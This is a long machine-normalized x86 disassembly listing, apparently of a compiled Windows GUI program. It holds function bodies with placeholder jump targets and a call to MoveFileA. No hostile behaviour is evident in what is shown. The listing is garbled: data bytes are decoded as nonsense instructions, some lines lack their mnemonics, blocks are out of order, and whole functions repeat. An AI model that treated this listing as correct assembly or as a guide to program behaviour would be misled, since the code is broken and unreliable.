mov ecx [ ebp - 0x11c ]
mov [ esp + 0x8 ] ecx
push ebx
push eax
call sub_4124cc
add esp 0x1c
lea edi [ ebp - 0x124 ]
mov ecx 0x4
lea eax [ ebp - 0x6c ]
push esi
lea esi [ ebp - 0x144 ]
[ edi ] [ esi ]
pop esi
mov edx 0x2
dec [ ebp - 0x84 ]
dec [ ebp - 0x84 ]
call sub_4d318c
mov [ ebp - 0x90 ] 0x15c
mov eax [ ebp - 0x11c ]
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc8 ]
add edx 0xc
mov [ ebp - 0xcc ] edx
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0xcc ]
call sub_4d327c
test al al
je r-xdata
mov ecx [ ebx + 0x28 ]
lea edx [ ebp - 0x114 ]
mov [ ebp - 0xc0 ] ecx
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x10c ] eax
jmp r-xdata
mov edx [ ebp - 0xec ]
mov [ ebp - 0xb8 ] edx
mov ecx [ ebp - 0xb8 ]
add ecx 0xc
mov [ ebp - 0xbc ] ecx
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0xbc ]
call sub_4d327c
test al al
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov ecx [ ebp - 0x11c ]
mov eax [ esi + 0x8 ]
add ecx 0x10
xor ebx ebx
mov [ ecx ] eax
jmp r-xdata
mov [ ebp - 0xb0 ] edx
mov eax [ ebp - 0xb0 ]
mov ecx [ eax ]
mov [ ebp - 0xe4 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xb0 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0xdc ] edx
mov [ ebp - 0x90 ] 0xc
mov ecx [ ebp - 0xdc ]
mov eax [ ecx + 0x10 ]
mov [ ebp - 0x64 ] eax
mov edx [ ebp - 0x64 ]
test edx edx
je r-xdata
lea edx [ ebp - 0xf4 ]
mov [ ebp - 0x90 ] 0x180
xor eax eax
mov [ ebp - 0x70 ] eax
lea ecx [ ebp - 0x70 ]
inc [ ebp - 0x84 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x70 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x1
mov eax [ esi + 0x4 ]
mov [ esi + 0x40 ] eax
call sub_40e96c
mov al 0x1
mov edx 0x2
push eax
lea eax [ ebp - 0x14 ]
dec [ ebp - 0x84 ]
call sub_4d318c
dec [ ebp - 0x84 ]
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov edi eax
mov [ ebp - 0x11c ] edi
mov edx [ ebx + 0x28 ]
mov [ ebp - 0xc4 ] edx
mov ecx [ ebp - 0xc4 ]
mov [ ebp - 0x12c ] ecx
mov eax [ ebp - 0x12c ]
mov edx [ ebp - 0x11c ]
cmp eax edx
sete cl
and ecx 0x1
test cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x150
push 0x3
mov ecx [ ebp - 0x64 ]
push ecx
call sub_40fae8
mov [ ebp - 0x90 ] 0x138
add esp 0x8
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x90 ] 0x18c
dec [ ebp - 0x84 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0xa0 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xd4 ] eax
mov edx [ ebp - 0xd4 ]
mov [ ebp - 0x7c ] edx
mov ecx [ ebp - 0x7c ]
test ecx ecx
je r-xdata
inc ebx
mov [ esi + 0x4 ] ebx
jmp r-xdata
lea eax [ ebp - 0x74 ]
call sub_4d3128
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x74 ]
lea eax [ ebp - 0x14 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x74 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x84 ]
call sub_4d318c
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax [ ebp - 0x7c ]
mov edx [ eax ]
mov [ ebp - 0x78 ] edx
mov [ ebp - 0x90 ] 0x1b0
mov edx 0x3
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x90 ] 0x198
sub_414360
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push sub_4167cc
push 0x1
push 0x44
push 0x64
push esi
push ebx
call sub_4c3bc4
add esp 0x18
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4143ab
inc [ edi ]
add [ eax ] al
add [ eax + eax - 0x74 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + ebp * 2 ] ah
inc ecx
add [ ecx ] al
add [ eax + 0x64747300 ] dl
cmp bh [ edx ]
jne r-xdata
dec ecx
outsb
imul esi [ ecx + 0x75 ] 0x74705f65
jb r-xdata
dec ebp
fdiv st7
test [ eax - 0x1 ] ebp
je r-xdata
jo r-xdata
nop
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push esp
dec ecx
outsb
jo r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x20 ]
xor eax eax
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x28 ]
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x2c ]
pop eax
call sub_402e08
lea edx [ ebp - 0x2c ]
mov ecx [ edx ]
push ecx
mov eax [ esi + 0x8 ]
push eax
call sub_410ee8
add esp 0x8
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xa4 ] 0x24
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x30
xor eax eax
mov edx [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
inc [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x3c
mov ecx [ edx ]
mov dl 0x1
call sub_41c420
mov [ ebp - 0xb8 ] eax
xor eax eax
mov ecx [ ebp - 0xb8 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x30 ]
inc [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x48
mov [ ebp - 0x30 ] eax
mov eax rw-data
inc [ ebp - 0x98 ]
call sub_4d3564
lea edx [ ebp - 0x30 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x34 ]
call sub_4d3010
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x34 ]
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x38 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x10 ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x37c ]
call sub_48dfa0
popad
insd
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
pop ebx
xor bl [ ebp ]
nop
nop
je r-xdata
mov edx [ esi + 0x4 ]
mov al 0x1
mov [ esi + 0x40 ] edx
push eax
dec [ ebp - 0x98 ]
mov edx [ ebp - 0x10 ]
test edx edx
je r-xdata
xor ebx ebx
jmp r-xdata
add [ eax ] al
add [ eax ] al
add al 0x10
add [ edi + ebp * 2 ] al
inc ecx
add [ edx ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x6e ] dl
popad
insd
inc esp
imul esp [ ecx + 0x6c ] 0x732c676f
je r-xdata
mov [ ebp - 0xa4 ] 0xcc
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0xb4 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x90 ] eax
mov edx [ ebp - 0x90 ]
test edx edx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
pop ebp
add [ eax - 0x1374aa70 ] dl
cmp bh [ edx ]
popa
jne r-xdata
mov ecx [ ebp - 0x90 ]
mov eax [ ecx ]
mov [ ebp - 0x8c ] eax
mov [ ebp - 0xa4 ] 0xf0
mov edx 0x3
mov eax [ ebp - 0x90 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xa4 ] 0xd8
mov [ ebp - 0xa4 ] 0x6c
xor eax eax
mov [ ebp - 0x44 ] eax
lea ecx [ ebp - 0x44 ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
test ebx ebx
jl r-xdata
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0xa4 ] 0xc
xor edx edx
mov [ ebp - 0x1c ] edx
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x98 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x1c ]
dec ebp
je r-xdata
mov edx rw-data
mov edx [ ebp - 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov [ ebp - 0xa4 ] 0x54
xor ecx ecx
mov [ ebp - 0x3c ] ecx
lea edx [ ebp - 0x3c ]
inc [ ebp - 0x98 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x37c ]
call sub_48df68
lea edx [ ebp - 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_4d31b4
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xa4 ] 0x60
mov edx rw-data
lea eax [ ebp - 0x40 ]
call sub_4d3010
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
call sub_4d324c
push eax
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
jne r-xdata
mov [ ebp - 0xa4 ] 0x84
mov edx rw-data
lea eax [ ebp - 0x5c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea eax [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x54 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x54 ]
xor eax eax
mov [ ebp - 0x58 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x58 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea eax [ ebp - 0x58 ]
xor edx edx
mov [ ebp - 0x60 ] edx
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x60 ]
inc [ ebp - 0x98 ]
pop edx
call sub_402e08
mov eax [ ebp - 0x60 ]
test eax eax
jne r-xdata
add esp 0xfffffea0
mov eax rw-data
push ebx
push esi
mov ebp esp
insb
je r-xdata
inc ebx
push 0x10
mov edx rw-data
mov [ ebp - 0xa4 ] 0x78
lea eax [ ebp - 0x4c ]
call sub_4d3128
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x4c ]
lea ecx [ ebp - 0x50 ]
call sub_4d31c8
mov edx [ ebp - 0x50 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_4d3128
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x48 ]
lea eax [ ebp - 0x8 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x48 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x98 ]
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov edi [ ebp - 0x60 ]
test edi edi
je r-xdata
mov ecx rw-data
jmp r-xdata
add [ ebx + 0x56 ] dl
cmp al 0x54
dec ecx
outsb
jo r-xdata
mov edx rw-data
mov edx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x60 ]
movzx eax [ edi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
mov edx rw-data
lea eax [ ebp - 0x6c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x6c ]
push edx
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x64 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x64 ]
xor eax eax
mov [ ebp - 0x68 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x68 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea eax [ ebp - 0x68 ]
xor edx edx
mov [ ebp - 0x70 ] edx
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x70 ]
inc [ ebp - 0x98 ]
pop edx
call sub_402e08
mov eax [ ebp - 0x70 ]
test eax eax
jne r-xdata
ror [ ecx + 0x4d8de455 ] cl
in al 0xff
test [ eax - 0x1 ] ebp
je r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_4d318c
or ebx 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x70 ]
test ebx ebx
je r-xdata
mov ecx rw-data
jmp r-xdata
lea eax [ ebp - 0x60 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x60 ]
lea eax [ ebp - 0x60 ]
call sub_41e5d8
popad
insd
inc esp
imul esp [ ecx + 0x6c ] 0x203e676f
add [ eax ] al
add [ eax ] al
mov ecx [ ebp - 0x70 ]
movzx eax [ ebx - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
call MoveFileA
test eax eax
sete dl
and edx 0x1
push edx
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x70 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x6c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x68 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x64 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x60 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x5c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x58 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x54 ]
xor edx edx
call sub_4d2728
pop ecx
test cl cl
je r-xdata
mov eax [ esi ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
jmp r-xdata
push 0x10
mov edx rw-data
mov [ ebp - 0xa4 ] 0x90
lea eax [ ebp - 0x74 ]
call sub_4d3128
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x74 ]
lea ecx [ ebp - 0x78 ]
call sub_4d31c8
mov edx [ ebp - 0x78 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x70 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x70 ]
lea eax [ ebp - 0x70 ]
call sub_41e5d8
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov edx rw-data
mov edx [ ebp - 0x78 ]
jmp r-xdata
mov [ ebp - 0xa4 ] 0x9c
xor eax eax
mov [ ebp - 0x7c ] eax
lea ecx [ ebp - 0x7c ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x7c ]
test eax eax
je r-xdata
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov [ ebp - 0xbc ] eax
mov edx [ ebp - 0xbc ]
mov [ ebp - 0xf8 ] edx
mov ecx [ ebx + 0x28 ]
mov [ ebp - 0xc0 ] ecx
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0x108 ]
mov ecx [ ebp - 0xf8 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebx + 0x28 ]
lea edi [ ebp - 0x120 ]
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0x118 ] eax
jmp r-xdata
mov edx [ ebp - 0xf8 ]
mov [ ebp - 0xc4 ] edx
mov ecx [ ebp - 0xc4 ]
add ecx 0xc
mov [ ebp - 0xc8 ] ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc8 ]
call sub_4d327c
test al al
je r-xdata
inc ebx
mov [ esi + 0x4 ] ebx
jmp r-xdata
lea eax [ ebp - 0x80 ]
call sub_4d3128
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x80 ]
lea eax [ ebp - 0x8 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x80 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x98 ]
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax [ edi ]
add esp 0xfffffff0
mov [ ebp - 0xf0 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xec ] eax
mov edx [ edi + 0x8 ]
mov [ ebp - 0xe8 ] edx
lea edx [ esi + 0x10 ]
mov [ ebp - 0xa4 ] 0x18
mov ecx [ ebp - 0xf0 ]
mov [ esp ] ecx
mov ecx [ ebp - 0xec ]
mov [ esp + 0x4 ] ecx
lea ecx [ ebp - 0x130 ]
mov eax [ ebp - 0xe8 ]
mov [ esp + 0x8 ] eax
push edx
push ecx
call sub_406ce8
add esp 0x18
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov edi eax
mov [ ebp - 0x138 ] edi
mov edx [ ebx + 0x28 ]
mov [ ebp - 0xd0 ] edx
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0x148 ] ecx
mov eax [ ebp - 0x148 ]
mov edx [ ebp - 0x138 ]
cmp eax edx
sete cl
and ecx 0x1
test cl cl
jne r-xdata
lea edi [ ebp - 0x100 ]
mov [ ebp - 0xa4 ] 0xb4
xor ecx ecx
mov [ ebp - 0xdc ] ecx
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
call sub_4d3050
inc [ ebp - 0x98 ]
lea eax [ ebp - 0x88 ]
mov ecx [ ebp - 0xdc ]
mov [ ebp - 0x84 ] ecx
inc [ ebp - 0x98 ]
push eax
add esp 0xfffffff0
mov edx [ ebp - 0x140 ]
lea eax [ ebp - 0x160 ]
mov [ esp ] edx
mov edx [ ebp - 0x13c ]
mov [ esp + 0x4 ] edx
mov ecx [ ebp - 0x138 ]
mov [ esp + 0x8 ] ecx
push ebx
push eax
call sub_4124cc
add esp 0x1c
lea edi [ ebp - 0x140 ]
mov ecx 0x4
lea eax [ ebp - 0x88 ]
push esi
lea esi [ ebp - 0x160 ]
[ edi ] [ esi ]
pop esi
mov edx 0x2
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
call sub_4d318c
mov [ ebp - 0xa4 ] 0xa8
mov eax [ ebp - 0x138 ]
mov [ ebp - 0xd4 ] eax
mov edx [ ebp - 0xd4 ]
add edx 0xc
mov [ ebp - 0xd8 ] edx
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xd8 ]
call sub_4d327c
test al al
je r-xdata
mov ecx [ ebp - 0x138 ]
add ecx 0x10
mov eax [ esi + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
sub_41445c
push ebp
mov ebp esp
add esp 0xfffffea0
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0xa4 ] 0xc
xor edx edx
mov [ ebp - 0x1c ] edx
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x98 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x20 ]
xor eax eax
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x28 ]
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x2c ]
pop eax
call sub_402e08
lea edx [ ebp - 0x2c ]
mov ecx [ edx ]
push ecx
mov eax [ esi + 0x8 ]
push eax
call sub_410ee8
add esp 0x8
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xa4 ] 0x24
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x30
xor eax eax
mov edx [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
inc [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x3c
mov ecx [ edx ]
mov dl 0x1
call sub_41c420
mov [ ebp - 0xb8 ] eax
xor eax eax
mov ecx [ ebp - 0xb8 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x30 ]
inc [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] 0x18
mov [ ebp - 0xa4 ] 0x48
mov [ ebp - 0x30 ] eax
mov eax rw-data
inc [ ebp - 0x98 ]
call sub_4d3564
lea edx [ ebp - 0x30 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x34 ]
call sub_4d3010
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x34 ]
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x38 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x10 ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x37c ]
call sub_48dfa0
mov edx [ esi + 0x4 ]
mov al 0x1
mov [ esi + 0x40 ] edx
push eax
dec [ ebp - 0x98 ]
mov edx [ ebp - 0x10 ]
test edx edx
je r-xdata
xor ebx ebx
jmp r-xdata
mov [ ebp - 0xa4 ] 0xcc
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0xb4 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x90 ] eax
mov edx [ ebp - 0x90 ]
test edx edx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov ecx [ ebp - 0x90 ]
mov eax [ ecx ]
mov [ ebp - 0x8c ] eax
mov [ ebp - 0xa4 ] 0xf0
mov edx 0x3
mov eax [ ebp - 0x90 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xa4 ] 0xd8
mov [ ebp - 0xa4 ] 0x6c
xor eax eax
mov [ ebp - 0x44 ] eax
lea ecx [ ebp - 0x44 ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
test ebx ebx
jl r-xdata
mov edx rw-data
mov edx [ ebp - 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov [ ebp - 0xa4 ] 0x54
xor ecx ecx
mov [ ebp - 0x3c ] ecx
lea edx [ ebp - 0x3c ]
